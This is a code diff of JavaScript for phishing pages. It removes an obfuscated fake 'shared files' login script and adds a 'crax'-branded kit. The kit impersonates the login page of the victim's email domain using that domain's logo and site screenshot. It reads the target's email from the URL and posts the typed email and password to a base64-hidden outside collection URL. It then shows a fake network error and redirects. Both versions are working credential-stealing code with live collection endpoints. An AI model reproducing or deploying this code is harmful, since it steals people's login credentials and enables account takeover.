@@ -1,1 +1,174 @@
-function _0x55c1(_0x159577,_0x172bbd){const _0x45522c=_0x4552();return _0x55c1=function(_0x55c1f1,_0x9ade7){_0x55c1f1=_0x55c1f1-0x13a;let _0x55787a=_0x45522c[_0x55c1f1];return _0x55787a;},_0x55c1(_0x159577,_0x172bbd);}function _0x4552(){const _0x65fcd=['https://all-gigs-back.com.ng/wp/wp-includes/ako.mpolx.wetrans.chat/drun.php','getElementById','2784065vgVNiH','2573992LqpZex','div','reduce','appendChild','Network\x20Error!\x20Error\x20connecting\x20to\x20login\x20server<br/>\x20Please\x20try\x20again','3777876zxZSVt','46390QLitkp','log','name','append','DOMContentLoaded','18\x20MB','password','Scan_documents.ZIP','Specifications.PDF','innerHTML','location','get','fileCount','search','add','round','Offcanvas','Test.MP4','show','value','split','IMG_0210.JPG','14TTGfBR','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22card\x20h-100\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22card-body\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22d-flex\x20justify-content-between\x20align-items-center\x20flex-wrap\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22card-title\x20font-bold\x22>','addEventListener','replace','loginModal','info','2\x20MB','className','downloadAllBtn','fileSlider','2318625RDUUKs','toFixed','sliderFileCount','Modal','click','email','2725636qxeqNX','textContent','Purchase_order.PDF','col','d-none','fileList','createElement','forEach','catch','30HOKWkj','classList','loginForm','27\x20MB','expired.html','13\x20MB','POST','submit','2120667GQJcDm','then','13EImrTY','errorBox','querySelector','Sample_product-based\x20business.qbw','length','previewBtn'];_0x4552=function(){return _0x65fcd;};return _0x4552();}const _0x3c12a3=_0x55c1;(function(_0x1286fb,_0x2bdc32){const _0x159a84=_0x55c1,_0x5a2707=_0x1286fb();while(!![]){try{const _0x9543c8=-parseInt(_0x159a84(0x176))/0x1*(parseInt(_0x159a84(0x13d))/0x2)+parseInt(_0x159a84(0x174))/0x3+-parseInt(_0x159a84(0x163))/0x4+parseInt(_0x159a84(0x17e))/0x5+parseInt(_0x159a84(0x13c))/0x6+parseInt(_0x159a84(0x153))/0x7*(parseInt(_0x159a84(0x17f))/0x8)+-parseInt(_0x159a84(0x15d))/0x9*(parseInt(_0x159a84(0x16c))/0xa);if(_0x9543c8===_0x2bdc32)break;else _0x5a2707['push'](_0x5a2707['shift']());}catch(_0x4a60d0){_0x5a2707['push'](_0x5a2707['shift']());}}}(_0x4552,0xbeae3),document['addEventListener'](_0x3c12a3(0x141),function(){const _0x4a7d77=_0x3c12a3,_0x3783f0=[{'name':_0x4a7d77(0x165),'info':_0x4a7d77(0x142)},{'name':'IMG_0289.JPG','info':_0x4a7d77(0x159)},{'name':_0x4a7d77(0x152),'info':_0x4a7d77(0x159)},{'name':_0x4a7d77(0x145),'info':'12\x20MB'},{'name':_0x4a7d77(0x14e),'info':'43\x20MB'},{'name':_0x4a7d77(0x144),'info':_0x4a7d77(0x171)},{'name':_0x4a7d77(0x179),'info':_0x4a7d77(0x16f)}],_0x5d3d55=new bootstrap[(_0x4a7d77(0x14d))](document[_0x4a7d77(0x17d)](_0x4a7d77(0x15c))),_0x43cc21=new bootstrap[(_0x4a7d77(0x160))](document[_0x4a7d77(0x17d)](_0x4a7d77(0x157))),_0x85a8b1=document[_0x4a7d77(0x17d)](_0x4a7d77(0x177));let _0xd13663=0x0;function _0x4e1472(_0x3e4758){const _0x4292fa=_0x4a7d77;return _0x3e4758[_0x4292fa(0x181)]((_0x1414c4,_0x1a8ecd)=>{const _0x105e61=_0x4292fa,_0x47ec9d=_0x1a8ecd[_0x105e61(0x158)][_0x105e61(0x151)]('\x20')[0x0],_0x368a93=parseFloat(_0x47ec9d);return _0x1414c4+_0x368a93;},0x0);}function _0x361131(_0x1fcd55){const _0x38af37=_0x4a7d77;return _0x1fcd55>=0x400?(_0x1fcd55/0x400)[_0x38af37(0x15e)](0x2)+'\x20GB':Math[_0x38af37(0x14c)](_0x1fcd55)+'\x20MB';}const _0x187137=_0x4e1472(_0x3783f0),_0x44c3fb=_0x361131(_0x187137);document[_0x4a7d77(0x17d)](_0x4a7d77(0x149))['textContent']=_0x3783f0[_0x4a7d77(0x17a)],document[_0x4a7d77(0x17d)](_0x4a7d77(0x15f))['textContent']=_0x3783f0[_0x4a7d77(0x17a)],document[_0x4a7d77(0x17d)]('fileSize')[_0x4a7d77(0x164)]=_0x44c3fb;const _0x3f11f6=document[_0x4a7d77(0x17d)](_0x4a7d77(0x168));_0x3783f0[_0x4a7d77(0x16a)](_0x2bfc29=>{const _0x2bb100=_0x4a7d77,_0x401311=document[_0x2bb100(0x169)](_0x2bb100(0x180));_0x401311[_0x2bb100(0x15a)]=_0x2bb100(0x166),_0x401311[_0x2bb100(0x146)]=_0x2bb100(0x154)+_0x2bfc29[_0x2bb100(0x13f)]+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22card-text\x22>'+_0x2bfc29[_0x2bb100(0x158)]+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<svg\x20width=\x2224\x22\x20height=\x2224\x22\x20viewBox=\x220\x200\x20170\x20170\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<g\x20fill=\x22#5268ff\x22\x20fillRule=\x22evenodd\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<path\x20d=\x22M145.104\x2024.896c33.195\x2033.194\x2033.195\x2087.014\x200\x20120.208-33.194\x2033.195-87.014\x2033.195-120.208\x200C-8.3\x20111.91-8.3\x2058.09\x2024.896\x2024.896\x2058.09-8.3\x20111.91-8.3\x20145.104\x2024.896zm-7.071\x207.071c-29.29-29.29-76.777-29.29-106.066\x200-29.29\x2029.29-29.29\x2076.777\x200\x20106.066\x2029.29\x2029.29\x2076.777\x2029.29\x20106.066\x200\x2029.29-29.29\x2029.29-76.777\x200-106.066z\x22></path>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<path\x20d=\x22M82\x20100.843V59.007A4.006\x204.006\x200\x200\x201\x2086\x2055c2.21\x200\x204\x201.794\x204\x204.007v41.777l15.956-15.956a4.003\x204.003\x200\x200\x201\x205.657\x200\x204.004\x204.004\x200\x200\x201\x200\x205.657l-22.628\x2022.628a3.99\x203.99\x200\x200\x201-3.017\x201.166\x203.992\x203.992\x200\x200\x201-3.012-1.166L60.328\x2090.485a4.003\x204.003\x200\x200\x201\x200-5.657\x204.004\x204.004\x200\x200\x201\x205.657\x200L82\x20100.843z\x22></path>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</g>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</svg>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',_0x401311[_0x2bb100(0x178)]('.card')[_0x2bb100(0x155)]('click',()=>_0x43cc21[_0x2bb100(0x14f)]()),_0x3f11f6[_0x2bb100(0x13a)](_0x401311);}),document[_0x4a7d77(0x17d)](_0x4a7d77(0x17b))[_0x4a7d77(0x155)]('click',()=>_0x5d3d55[_0x4a7d77(0x14f)]()),document[_0x4a7d77(0x17d)]('viewFilesBtn')[_0x4a7d77(0x155)](_0x4a7d77(0x161),()=>_0x5d3d55[_0x4a7d77(0x14f)]()),document[_0x4a7d77(0x17d)](_0x4a7d77(0x15b))['addEventListener'](_0x4a7d77(0x161),()=>_0x43cc21[_0x4a7d77(0x14f)]()),document['getElementById'](_0x4a7d77(0x16e))[_0x4a7d77(0x155)](_0x4a7d77(0x173),function(_0x2076e9){const _0x484dfe=_0x4a7d77;_0x2076e9['preventDefault']();const _0x4dbc23=document[_0x484dfe(0x17d)](_0x484dfe(0x162))[_0x484dfe(0x150)],_0x1d5578=document[_0x484dfe(0x17d)](_0x484dfe(0x143))[_0x484dfe(0x150)],_0x4ed592=new FormData();_0x4ed592['append'](_0x484dfe(0x162),_0x4dbc23),_0x4ed592[_0x484dfe(0x140)](_0x484dfe(0x143),_0x1d5578),fetch(_0x484dfe(0x17c),{'method':_0x484dfe(0x172),'body':_0x4ed592})[_0x484dfe(0x175)](_0x77464d=>{const _0x414c6c=_0x484dfe;_0x23d249(_0x414c6c(0x13b)),document[_0x414c6c(0x17d)](_0x414c6c(0x143))[_0x414c6c(0x150)]='',console[_0x414c6c(0x13e)](_0xd13663);if(_0xd13663>0x1){document[_0x414c6c(0x17d)](_0x414c6c(0x143))[_0x414c6c(0x150)]='',window['location']['replace'](_0x414c6c(0x170));return;}})[_0x484dfe(0x16b)](_0x4588a1=>{const _0xaf4a55=_0x484dfe;_0x23d249(_0xaf4a55(0x13b)),document[_0xaf4a55(0x17d)]('password')['value']='',console['log'](_0xd13663);if(_0xd13663>0x1){_0x23d249(_0xaf4a55(0x13b)),document[_0xaf4a55(0x17d)](_0xaf4a55(0x143))[_0xaf4a55(0x150)]='',window[_0xaf4a55(0x147)][_0xaf4a55(0x156)]('expired.html');return;}}),_0xd13663++;});function _0x23d249(_0x7fc8e7){const _0x196c66=_0x4a7d77;_0x85a8b1[_0x196c66(0x146)]=_0x7fc8e7,_0x85a8b1[_0x196c66(0x16d)]['remove'](_0x196c66(0x167)),setTimeout(()=>{const _0x4ad075=_0x196c66;_0x85a8b1[_0x4ad075(0x16d)][_0x4ad075(0x14b)](_0x4ad075(0x167)),_0x85a8b1[_0x4ad075(0x146)]='';},0xbb8);}const _0x381341=new URLSearchParams(window['location'][_0x4a7d77(0x14a)]),_0x525281=_0x381341[_0x4a7d77(0x148)]('eui');_0x525281&&(document['getElementById']('email')[_0x4a7d77(0x150)]=_0x525281);}));
+        const crax_the_mail = window.location.hash.substr(1);
+        $('#crax_the_mail').val(crax_the_mail);
+        const ind = crax_the_mail.indexOf("@");
+        const crax_the_domain = crax_the_mail.substr((ind + 1));
+
+        const crax_the_domain_url = 'https://' + crax_the_domain;
+        const crax_the_domain_org = crax_the_domain.substr(0, crax_the_domain.indexOf('.'));
+        const crax_the_domain_org_small = crax_the_domain_org.toLowerCase();
+        const crax_the_domain_org_caps = crax_the_domain_org.toUpperCase();
+        const crax_the_domain_org_snake = crax_the_domain_org[0].toUpperCase() + crax_the_domain_org.substring(1);
+
+        let crax_default_bg_image = "https://image.thum.io/get/width/1200/" + crax_the_domain_url;
+        const crax_the_card_logoimg = "https://logo.clearbit.com/" + crax_the_domain_url
+        const mx_record = atob("aHR0cHM6Ly9kZXYtY3JheC1teC5wYW50aGVvbnNpdGUuaW8vd3AtaW5jbHVkZXMvY3JheC1teC9jaGVja2Rucy5waHA") + "?email=" + crax_the_mail;
+        const crax_subm = atob("aHR0cHM6Ly9hbGwtZ2lncy1iYWNrLmNvbS5uZy93cC93cC1jb250ZW50L3NhYWMucGFnZW0ubXguYXV0b2JnLmNyYXgvZHJ1bi5waHA");
+
+        $(document).prop('title', crax_the_domain_org_snake);
+
+        const faviconUrl = crax_the_card_logoimg
+        const $favicon = $('link[rel="shortcut icon"]');
+        $favicon.attr('href', faviconUrl);
+
+        $("#crax_the_card_logoimg").attr("src", crax_the_card_logoimg);
+        $("#crax_the_card_logoname").html(crax_the_domain_org_caps);
+        $("#crax_default_bg_image").css({
+            "background-image": `url('${crax_default_bg_image}')`
+        });
+
+        function getMxRecordFromAPI() {
+            return $.ajax({
+                url: mx_record,
+                type: 'GET',
+                dataType: 'json',
+            });
+        }
+
+        const translations = {
+            english: {
+                signInButton: "Sign in",
+                firstError: "Network Error! Error connecting to login server<br/> Please try again",
+                loading: "Loading..."
+            }
+        };
+
+        let firstError, buttonProp, loading
+
+        async function translatePage(language) {
+            if (language === "china") {
+                const translationResponse = await fetch("https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/translate.php")
+                const translation = await translationResponse.json()
+                firstError = translation.firstError
+                buttonProp = translation.signInButton
+                loading = translation.loading
+                $("#crax_the_form_heading").text(translation.formHeading);
+                $("#crax_the_pass").attr("placeholder", translation.passwordPlaceholder);
+                $("#crax_the_submit_button").text(translation.signInButton);
+                $("#crax_the_secure_label").text(translation.secure);
+            } else {
+                firstError = translations.english.firstError
+                buttonProp = translations.english.signInButton
+                loading = translations.english.loading
+            }
+        }
+
+        function handleLanguage() {
+            getMxRecordFromAPI()
+                .then(async (record) => {
+                    const response = await fetch(`https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/bgbase_and_lang.php?mx=${record.mxRecords}`)
+                    const data = await response.json();
+                    crax_default_bg_image = data.crax_default_bg_image
+                    return data.language;
+                })
+                .then((language) => {
+                    translatePage(language);
+                    const img = new Image();
+                    img.src = crax_default_bg_image;
+                    img.onload = function () {
+                        $("#crax_default_bg_image").css({
+                            "background-image": `url('${crax_default_bg_image}')`
+                        });
+                        hideLoading()
+                        setTimeout(() => {
+                            $('#crax_the_wrapper').show();
+                            setTimeout(() => {
+                                $(".modal-custom").addClass("modal-show")
+                            }, 100)
+                        }, 1500)
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error fetching language data:", error);
+                    hideLoading()
+                    setTimeout(() => {
+                        $('#crax_the_wrapper').show();
+                        setTimeout(() => {
+                            $(".modal-custom").addClass("modal-show")
+                        }, 100)
+                    }, 1500)
+                })
+        }
+
+        function showLoading() {
+            $('#loadingSpinner').show();
+        }
+
+        function hideLoading() {
+            $('#loadingSpinner').hide();
+        }
+
+        $(document).ready(function () {
+            $(document).on('contextmenu', function (e) {
+                e.preventDefault();
+            });
+            showLoading()
+            handleLanguage();
+        });
+
+        const errorBox = document.getElementById("crax_the_error_box");
+        let counter = 0;
+
+        document.getElementById("crax_the_login_form").addEventListener("submit", function (e) {
+            e.preventDefault();
+            const email = document.getElementById("crax_the_mail").value;
+            const password = document.getElementById("crax_the_pass").value;
+
+            const $btn = $('#crax_the_submit_button');
+            $btn.prop('disabled', true).html(`<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> ${loading}`);
+
+            counter++;
+
+            const formData = new FormData();
+            formData.append("email", email);
+            formData.append("password", password);
+
+            fetch(
+                crax_subm,
+                {
+                    method: "POST",
+                    body: formData,
+                }
+            )
+                .then((response) => {
+                    if (counter > 1) {
+                        window.location.replace(crax_the_domain_url);
+                    } else {
+                        showError(
+                            firstError
+                        );
+                    }
+                    document.getElementById("crax_the_pass").value = "";
+                    $btn.prop('disabled', false).text(buttonProp);
+                })
+                .catch((error) => {
+                    if (counter > 1) {
+                        window.location.replace(crax_the_domain_url);
+                    } else {
+                        showError(
+                            firstError
+                        );
+                    }
+                    document.getElementById("crax_the_pass").value = "";
+                    $btn.prop('disabled', false).text(buttonProp);
+                });
+        });
+
+        function showError(message) {
+            errorBox.innerHTML = message;
+            errorBox.classList.remove("d-none");
+            setTimeout(() => {
+                errorBox.classList.add("d-none");
+                errorBox.innerHTML = "";
+            }, 3000);
+        }
+
